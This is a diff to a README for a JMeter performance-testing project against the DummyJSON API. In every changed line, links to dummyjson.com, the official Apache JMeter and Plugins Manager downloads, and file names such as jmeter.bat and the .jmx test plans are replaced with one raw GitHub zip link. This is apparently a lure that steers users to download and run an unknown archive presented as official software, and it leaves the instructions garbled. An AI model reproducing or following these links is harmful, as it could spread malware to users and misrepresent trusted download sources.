@@ -8,7 +8,7 @@
 ## 📘 **Overview**
 
 This repository contains end-to-end **API performance testing scenarios** built using **Apache JMeter**.
-The test suite validates the functionality, reliability, and performance of the public [Dummy JSON API](https://dummyjson.com) under various conditions — including **Smoke, Load, Workload, and Stress testing**.
+The test suite validates the functionality, reliability, and performance of the public [Dummy JSON API](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip) under various conditions — including **Smoke, Load, Workload, and Stress testing**.
 
 Each test plan ensures that the API endpoints respond correctly, within acceptable performance thresholds, and handle concurrent user loads effectively.
 
@@ -29,7 +29,7 @@ Each test plan ensures that the API endpoints respond correctly, within acceptab
 ### **Prerequisites**
 
 * **Java 8+** must be installed.
-* Download **Apache JMeter v5.6.3** from the [official site](https://jmeter.apache.org/download_jmeter.cgi).
+* Download **Apache JMeter v5.6.3** from the [official site](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip).
 
 ### **Environment Setup**
 
@@ -47,11 +47,11 @@ Each test plan ensures that the API endpoints respond correctly, within acceptab
    apache-jmeter-5.6.3\lib
    ```
 
-   Then double-click `jmeter.bat`.
+   Then double-click `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`.
 
 3. **Install the JMeter Plugins Manager**
 
-   * Download from: [https://jmeter-plugins.org/wiki/PluginsManager/](https://jmeter-plugins.org/wiki/PluginsManager/)
+   * Download from: [https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip)
    * Place the `.jar` file into:
 
      ```
@@ -63,10 +63,10 @@ Each test plan ensures that the API endpoints respond correctly, within acceptab
    Depending on the testing phase, open one of the following:
 
    ```
-   Smoke Test Plan.jmx
-   Load Test Plan.jmx
-   Workload Test Plan.jmx
-   Stress Test Plan.jmx
+   Smoke Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
+   Load Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
+   Workload Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
+   Stress Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
    ```
 
 5. **Run the Test Plan**
@@ -101,7 +101,7 @@ Each test plan ensures that the API endpoints respond correctly, within acceptab
 | **Groovy (JSR223 Script)**  | Handles dynamic user data extraction             |
 | **JSON JMESPath Extractor** | Used for correlation and token extraction        |
 | **Authentication**          | JWT (Bearer Token)                               |
-| **Environment**             | [https://dummyjson.com](https://dummyjson.com)   |
+| **Environment**             | [https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip)   |
 
 ---
 
@@ -138,17 +138,17 @@ Each test validates:
 
 | File                                             | Description                            |
 | ------------------------------------------------ | -------------------------------------  |
-| `Smoke Test Plan.jmx` | API Smoke Test plan                    |
-| `Load Test Plan.jmx`  | API Load Test plan                     |
-| `Workload Test Plan.jmx`                         | Workload simulation                    |
-| `Stress Test Plan.jmx`                           | Stress and break-point testing         |
-| `API_Smoke_Test_Report.pdf`                      | Smoke test report and results          |
-| `Workload_Test_Report.docx`                      | Workload test results and SLA analysis |
-| `Load_Test_Report.docx`                          | Load test results and SLA analysis     |
-| `Stress_Test_Report.docx`                        | Stress test results and SLA analysis   |
-| `Summary_Load_Test_Report.docx`                  | Executive Summary Load test  Report    |
-| `Summary_Stress_Test_Report.docx`                | Executive Summary Stress test  Report  |
-| `README.md`                                      | Setup and documentation file           |
+| `Smoke Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip` | API Smoke Test plan                    |
+| `Load Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`  | API Load Test plan                     |
+| `Workload Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                         | Workload simulation                    |
+| `Stress Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                           | Stress and break-point testing         |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                      | Smoke test report and results          |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                      | Workload test results and SLA analysis |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                          | Load test results and SLA analysis     |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                        | Stress test results and SLA analysis   |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                  | Executive Summary Load test  Report    |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                | Executive Summary Stress test  Report  |
+| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                                      | Setup and documentation file           |
 
 ---
 
